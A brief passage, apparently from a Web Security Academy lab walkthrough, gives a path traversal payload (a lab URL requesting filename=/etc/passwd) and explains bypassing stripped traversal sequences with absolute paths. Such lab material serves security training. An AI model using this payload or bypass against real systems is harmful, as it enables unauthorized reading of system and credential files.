Use the following payload:
```
https://acea1f6d1f57fc7bc05a8c5600750075.web-security-academy.net/image?filename=/etc/passwd
```

Note: If an application strips or blocks directory traversal sequences from the user-supplied filename, then it might be possible to bypass the defense using a variety of techniques. You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.
